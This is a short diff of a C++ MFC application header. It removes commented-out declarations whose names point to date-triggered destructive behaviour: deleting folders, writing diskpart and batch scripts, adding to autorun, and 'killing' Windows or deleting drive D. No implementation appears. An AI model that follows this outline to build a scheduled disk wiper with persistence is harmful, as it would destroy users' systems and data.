@@ -29,20 +29,6 @@ public:
 // Implementation
 
 	DECLARE_MESSAGE_MAP()
-
-	//bool InspectDeleteData();
-	//bool DeleteFolder();
-	//bool PerformATask(void);	
-	//void ReadRegDeleteDay(int& DelDay, int& DelWeek, int& Month);
-	//void GetCurrentDay(int& iDay, int& iDayOfWeek, int& iMonth);
-	//bool CreateDiskpartScript(wchar_t[], wchar_t[], wchar_t[]);
-	//bool CreateBatFile(wchar_t[], wchar_t[], wchar_t[], wchar_t[], wchar_t[]);
-	//void KeyBoardLedBlink(void);
-	//bool AddToAutorun(void);
-	//bool IfKillWindows(void);
-	//bool IfDeleteDiskD(void);
-	//void DoKillWindows(void);
 };
 
 extern CDeDayApp theApp;
-//extern CDeleteDay delDay;
